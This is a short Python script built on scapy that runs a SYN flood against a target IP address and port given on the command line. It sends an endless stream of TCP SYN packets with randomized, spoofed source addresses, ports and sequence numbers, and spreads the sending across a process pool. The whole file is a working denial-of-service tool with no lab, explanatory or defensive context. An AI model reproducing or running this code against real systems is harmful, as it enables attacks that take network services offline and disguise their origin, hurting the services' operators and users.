import sys
from scapy.all import *
from multiprocessing import Pool

def synFlood(targetIP, targetPort):
    ip = IP(id=RandShort(), src=RandIP(), dst=targetIP)
    tcp = TCP(
        sport = RandShort(), 
        dport = targetPort,
	seq = RandInt(),
        flags = "S"
    )
    pkt = ip / tcp
    send(pkt, loop=1, verbose=0)

args = sys.argv[1:]
if __name__ == "__main__":
    tIP = args[0]
    tP = int(args[1])
    numProcess = 1

    dataList = [(tIP, tP) for _ in range(numProcess)]
    with Pool(processes=numProcess) as p:
        p.starmap(synFlood, dataList)

